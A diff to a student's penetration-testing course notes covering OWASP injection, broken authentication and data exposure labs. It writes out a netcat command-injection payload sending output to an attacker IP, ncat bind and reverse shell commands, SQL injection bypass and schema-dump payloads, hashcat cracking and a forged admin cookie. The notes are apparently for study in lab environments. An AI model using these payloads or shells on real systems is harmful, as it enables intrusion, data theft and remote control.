@@ -46,14 +46,31 @@ this markdown file is to be used in conjunction with the slides and is supposed 
   - [xss attacking and sql injections](#xss-attacking-and-sql-injections)
     - [week 3: using xsser for xss attacks](#week-3-using-xsser-for-xss-attacks)
     - [week 3: using sqlmap](#week-3-using-sqlmap)
-- [day 4: authentication, cracking passwords and injections (command and sql injections)](#day-4-authentication-cracking-passwords-and-injections-command-and-sql-injections)
+- [day 4: authentication, cracking passwords and code injections](#day-4-authentication-cracking-passwords-and-code-injections)
   - [Authentication in HTTP](#authentication-in-http)
     - [Week 3 Labs: Hydra and HTTP auth](#week-3-labs-hydra-and-http-auth)
     - [Week 3: using hydra to attack form login](#week-3-using-hydra-to-attack-form-login)
     - [week 3: using zapproxy to attack form logins](#week-3-using-zapproxy-to-attack-form-logins)
     - [week 4: burpsuite login form attack](#week-4-burpsuite-login-form-attack)
   - [OWASP (open web application security project) top 10](#owasp-open-web-application-security-project-top-10)
+    - [Injection Attacks](#injection-attacks)
+      - [Week4 lab: OS command injection, blind and non-blind (3 labs underthis)](#week4-lab-os-command-injection-blind-and-non-blind-3-labs-underthis)
+        - [reverse shell vs bind shell](#reverse-shell-vs-bind-shell)
+        - [tool: netcat](#tool-netcat)
+      - [week 4 lab: bind vs reverse shell](#week-4-lab-bind-vs-reverse-shell)
     - [XSS](#xss)
+- [day 5: OWASP top10: Injections, Broken Auth, Improper Sessions Management & Sensitive Data Exposure](#day-5-owasp-top10-injections-broken-auth-improper-sessions-management--sensitive-data-exposure)
+  - [A1: Injection Attacks](#a1-injection-attacks)
+    - [week5 lab: SQLi bypassing auth, Free Article Submission](#week5-lab-sqli-bypassing-auth-free-article-submission)
+    - [week5 lab: SQL Injection -CVE: OpenSupports](#week5-lab-sql-injection--cve-opensupports)
+    - [SQL Injection](#sql-injection)
+  - [A2: broken auth](#a2-broken-auth)
+    - [week5: Broken Auth - Airline Booking – Update cookie](#week5-broken-auth---airline-booking--update-cookie)
+    - [Improper Session Management – Manipulate URL parameter](#improper-session-management--manipulate-url-parameter)
+  - [A3: sensitive data exposure](#a3-sensitive-data-exposure)
+    - [week5: SQL information available from Web Server Logs, real world webapp](#week5-sql-information-available-from-web-server-logs-real-world-webapp)
+- [current lab list](#current-lab-list)
+- [less important labs to do soon:](#less-important-labs-to-do-soon)
 - [todos and toreads](#todos-and-toreads)
 - [Useful References](#useful-references)
 
@@ -881,6 +898,7 @@ the idea is to collate vulnerabilities on a target website.
 
 ### week3: webapp scanning with [nikto](https://cirt.net/Nikto2)
 
+- note that nikto is a vulnerability scanning tool 
 - nikto gives like an audit report of sorts, tells us what is interesting to possibly look into
 - this lab exploited [Local File Inclusion Vulnerability](https://www.netsparker.com/blog/web-security/local-file-inclusion-vulnerability/). Taxonomy for such a vulnerability: 
   - Broken Access Control --> Insecure Direct Object References -->  Local File Inclusion
@@ -906,7 +924,7 @@ the idea is to collate vulnerabilities on a target website.
 
 ### week 3: using sqlmap
 
-# day 4: authentication, cracking passwords and injections (command and sql injections)
+# day 4: authentication, cracking passwords and code injections
 
 * encoding was never intended to secure things, it's mainly to prevent interference in characters...
 
@@ -1003,6 +1021,68 @@ there are 3 main ways we can implement authentication: (indicated by the `WWW-Au
 
 ## OWASP (open web application security project) top 10
 
+it's like a hall of fame for vulnerabilities
+
+
+### [Injection Attacks](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)
+
+- scanners and fuzzers can help find such injection flaws
+- vulnerability happens when the app relies on user-supplied data and not sufficient sanitisation of such user input is done.
+- Some of the more common injections are SQL, NoSQL, OS command, Object Relational Mapping (ORM), LDAP, and Expression Language (EL) or Object Graph Navigation Library (OGNL) injection.
+  
+* not exactly sure how, but [ping testing websites are useful somehow](https://www.site24x7.com/ping-test.html)
+
+
+#### Week4 lab: OS command injection, blind and non-blind (3 labs underthis)
+
+in the case where the injection is a blind injection, we have no way of directly seeing the output for the commands we inject, hence we do something like so: 
+
+1. on attacker's machine, open up a port using [netcat](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf) and listen: `$ nc -lvp 4444`
+2. now, using netcat, we can pipe the output of the blind command to the attacker machine w known listening port: `127.0.0.1 | nc 192.169.13.2 4444` <--- this goes into the input field of the form in that bWAPP page for pinging things
+
+##### reverse shell vs bind shell
+
+[here's a medium article comparing the two](https://medium.com/@PenTest_duck/bind-vs-reverse-vs-encrypted-shells-what-should-you-use-6ead1d947aa9)
+
+a bind shell binds some port in the target machine, to listen for commands. Consequences:
+  * anyone can send commands to that port 
+  * a case whereby the victim's firewall ends up blocking traffic on that port, rendering the backdoor as useless
+
+
+In order to setup a Netcat reverse shell we need to follow the following steps:
+
+  1. Setup a Netcat listener.
+  2. Connect to the Netcat listener from the target host.
+  3. Issue commands on the target host from the attack box.
+
+Bind shells:
+```
+Target: ncat -nvlp <port> -e {/bin/bash | cmd.exe} --ssl
+Attacker: ncat -nv <target-ip> <port>--ssl
+```
+Reverse shells:
+```
+Target: ncat -nv <target-ip> <port> -e {/bin/bash | cmd.exe} --ssl
+Attacker: ncat -nvlp <port>--ssl
+```
+
+
+note that reverse shell's traffic should be encrypted, for which there's the tool called [sbd, secure shell backdoor](https://tools.kali.org/maintaining-access/sbd)
+
+
+
+##### tool: netcat
+
+here's a [netcat tutorial series](https://www.hackingtutorials.org/networking/hacking-with-netcat-part-1-the-basics/)
+
+ Most common use for Netcat when it comes to hacking is setting up reverse and bind shells, piping and redirecting network traffic, port listening, debugging programs and scripts and banner grabbing.
+
+#### week 4 lab: bind vs reverse shell
+
+1. recon shows that target is running the XODA application, we attempt to look for metasploit module for that. within msfconsole, `search xoda`
+2. use identified module, set the relevant params, then `show payloads` to see available payloads for this particular exploit
+3. upon using the exploit, we can verify network connections using `netstat` <-- shows the local address and port, what protocol and which foreign ip it's communicating with
+
 
 ### XSS
 
@@ -1014,8 +1094,183 @@ Here's how zaproxy describes xss:
 > Persistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.
 
 
+# day 5: OWASP top10: Injections, Broken Auth, Improper Sessions Management & Sensitive Data Exposure
+
+why the same kinda vulnerabilities persist despite all the patches: 
+- basically the dev's profile
+- most webdev courses ignore the security aspects
+- functionality first somehow always
+- most software dev by junior devs
+
+
+## A1: Injection Attacks
+
+aim: security triangle of confidentiality, integrity, and availability to be completely compromised.
+
+[understanding url parameters](https://www.urlencoder.io/learn/) 
+  - special and reserved chars shall be [encoded either in hexadec, following the `%` sign](https://secure.n-able.com/webhelp/NC_9-1-0_SO_en/Content/SA_docs/API_Level_Integration/API_Integration_URLEncoding.html) 
+
+**SQLi**:
+- a sqli attack is likea stepping stone. a successful payload injection can allow the attacker to bypass auth and do crud actions on the data!
+  - basically total compromise is possible.
+
+- types of SQLi:  
+  - classic injection 
+    - union based sql injection
+    - error based sql injection
+  - blind sql injection
+    - boolean based
+    - time based 
+  - out of bound sql injection
+
+- a overview and a [walkthrough on it](https://www.acunetix.com/blog/articles/exploiting-sql-injection-example/)
+  * identifying whether SQL vulnerability exists: 
+    * generic SQLi payloads: 
+      * easiest way is to append a single quote `'` which will break the sql syntax and throw error
+      * `' or '1'='1`
+      * `– ' or '1'='1' --` (Comment)
+      * `– ' or '1'='1' #` (Comment)
+    * ^ the comment char depends on the sql engine chosen
+    * note, when initially playing around w an input field, what we are looking for is to see if our input causes the output of the application to change in any way. Ideally, we want to see an SQL error which could indicate that our input is parsed as part of a query
+  * Determining the table schema
+    * rmb that the db organisation might be non-standard, look propery to understand the table structures
+    * this seems like a schema dump, concatenated as a single string `/endpoint.php?user=-1+union+select+1,2,3,4,5,6,7,8,9,(SELECT+group_concat(table_name)+from+information_schema.tables+where+table_schema=database())`
+  * Attempt to find out user credentials, opbtain the admin's hashed pwd, following which do a dictionary attack on it to determine the action passoword (this article uses hashcat)
+      * using hashcat: 
+      ```
+      hashcat64 -m 400 -a 0 hash.txt wordlist.txt
+      -m = the type of the hash we want to crack. 400 is the hash type for WordPress (MD5)
+      -a = the attack mode. 0 is the Dictionary (or Straight) Attack
+      hash.txt = a file containing the hash we want to crack
+      wordlist.txt = a file containing a list of passwords in plaintext
+      ```
+
+
+### week5 lab: SQLi bypassing auth, Free Article Submission
+
+- the [free article submission exploit](https://www.exploit-db.com/exploits/35492)
+- basically, the overall search function in the webpage implies that the input fields aren't sanitised.
+  - check the `/admin` endpoint, attempt to let the auth pass by passing in the `" OR 1=1 #`
+
+### week5 lab: SQL Injection -CVE: OpenSupports
+- just reading the report on exploit db for the way to breach it. 
+- this required both the user and pwd fields to have the same payload, I don't really understand how it works though. QQ: how does this payload work :(
+
+### SQL Injection
+cid=1901
+**the first part is to inject into a login form to bypass auth** 
+- the payload is: `' or '1'='1`
+  put in both the uname and the pwd, and it results in the following query behind the scenes: `Select * from users where login='' or '1'='1' and password='' or '1'='1';`
+- alternatively, comment out the pwd field, here, from nmap, we know that it's running a MySQL server, so the syntax for commenting things out will be `--` or `#`
+  - for the pwd field, you have to close off the opened single apostrophe, so pass in `'` for the pwd field and for the uname field, pass in `` or '1'='1' --` to comment out the rest of the concatenated sql query
+  - the overall sql query becomes `Select * from users where login='' or '1'='1' -- ' and password='';`
+
+**the second part is to inject into a search field that uses HTTP GET** 
+- from just passing in `'` we know the query looks something like this: 
+  - `select * from movies where title like '%'%'`
+- a payload of `' or '1'='1` will return true for everything and dump all the available data!, the query will be `select * from movies where title like '%' or '1'='1%'`
+- payload can also include comment too: `' or '1'='1' #`, making the query `select * from movies where title like '%' or '1'='1' # %'` 
+
+**next part involves an input field that does a GET request to select from a db** 
+- here we try to inject code directly into the input params, check if that works first
+  - the test input of one `'` is actually `select * from movies where id = '` 
+- our payload shall be just `1 or 1=1` i think no need to put as a string cuz url params, being ASCII shall always be read as a string by the browser.
+- hints at server-side check that fetches only a single record, so we try to modify the limit: 
+  - `1 or 1=1 limit 2,1` <-- returns the third row of the table, change accordingly
+
+**SQL injection on a POST request** 
+- here, to accurately determine the HTTP method, just use a proxy, e.g. burpsuite to modify the request and inject directly into the HTTP packet
+
+QQ: why didn't it work when the comment char `--` was used???
+
+## A2: broken auth
+
+* **Authentication** vs **Authorisation**: 
+  * auth verifies user/process identity
+  * authorisation is the system mech that determines privileges and access rights to system resources
+* vulnerability via broken auth, examples: 
+  * credential stuffing can be done (permitted)? 
+  * brute force/automated attacks can be done
+  * default/weak pwd use
+  * weak credential recovery processes
+  * plain text/weak hashing done on pwd
+  * missing/useless multi-factor auth
+  * session ID related: 
+    * session ID is exposed in the url params 
+    * session ID not rotated after sucessful logins (can do replay attacks due to this?)
+    * validation for session ID not done properly 
+
+
+### week5: Broken Auth - Airline Booking – Update cookie
+cid=438
+- setting up burpsuite on our own computer, need to control proxy settings, don't fully understand everything yet actually.
+- the [exploit](https://www.exploit-db.com/exploits/39167) involves adding the following cookie: `Cookie: LoggedIn=yes` to the request for admin control panel and this cookie-based Authentication meant we just need the correct cookie.
+
+### Improper Session Management – Manipulate URL parameter
+refer: https://youtu.be/Yt-5Fgg-u_4
+https://www.attackdefense.com/challengedetails?cid=1899
+
+***Improper Session Management II– Manipulate cookie***
+refer: https://youtu.be/BvrKOK9Z7ok
+https://www.attackdefense.com/challengedetails?cid=1899
+
+***Decoding Encoded Cookie – Base64***
+https://youtu.be/NnweEYixzQg
+https://www.attackdefense.com/challengedetails?cid=1899
+
+***Sensitive data in web storage –inspect element from browser***
+https://youtu.be/Y_6bbhD8x3o
+https://www.attackdefense.com/challengedetails?cid=1899
+the various client-side info-storage options, one of the more used ones is in browser data itself
+
+
+
+[***Sensitive directories listed in robots.txt***](https://youtu.be/7s5RD4OHD4w)
+always make sure to look at robots.txt because knowing what the dev doesn't want listed, is usually very juicy!!
+always visit the robots.txt and see what's disallowed to the robots
+
+
+
+
+## A3: sensitive data exposure
+
+- in general: just don't store sensitive info on the client side
+
+***ENCODING =/= ENCRYPTION.***
+- encoding is more for the sake of some bijective mapping for the sake of standardising the chars used and prevents the use of special chars 
+  - e.g. urls have reserved char % and such...
+
+how to figure out
+
+### week5: SQL information available from Web Server Logs, real world webapp
+cid=11
+
+[straightforward exploit](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12604)
+
+they didn't restrict the db logs, can access it by going to the endpoint: 
+`/Data/Log/<YY_MM_DD>.log`
+
+- this lets us know what dbtables there are and the table names!
+
+
+
+
+
+
+# current lab list
+- [error based sql injection](https://www.attackdefense.com/challengedetails?cid=1903)
+- [blind time sql injection](https://www.attackdefense.com/challengedetails?cid=1902)
+
+# less important labs to do soon: 
+- [webtoshell](https://www.attackdefense.com/challengedetails?cid=883)
+- [some mvc thing](https://www.attackdefense.com/challengedetails?cid=1880) and [another mvc thing](https://www.attackdefense.com/challengedetails?cid=1802)
+- burp login form attack and http attack
 
 # todos and toreads
+* [deception](https://www.helpnetsecurity.com/2018/12/06/introduction-deception-technology/) technology and [honeypots](https://roi4cio.com/en/categories/category/deception-techniques-and-honeypots/)
+
+* [using default credential config](https://thor-sec.com/cheatsheet/shodan/shodan_cheat_sheet/)
+* [more on browser plugin and extensions](https://www.securityweek.com/websites-can-exploit-browser-extensions-steal-user-data)
 
 * [CRLF characters](https://tools.ietf.org/html/rfc2616)
 * [metasploit tutorial](https://www.youtube.com/watch?v=8lR27r8Y_ik)
@@ -1037,5 +1292,8 @@ Here's how zaproxy describes xss:
 * - [hydra](https://tools.kali.org/password-attacks/hydra)
   https://sectools.org/tag/pass-audit/
 * [metasploit tutorial](https://www.youtube.com/watch?v=8lR27r8Y_ik)
-* [red team tutorials, has nice cheatsheets and other tutorials on loads of pentesting tools](https://redteamtutorials.com/)
+* cheatsheets: 
+  * [red team tutorials, has nice cheatsheets and other tutorials on loads of pentesting tools](https://redteamtutorials.com/)
+  * [netcat cheatsheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)
+  * [sql cheatsheet](https://devhints.io/mysql)
 
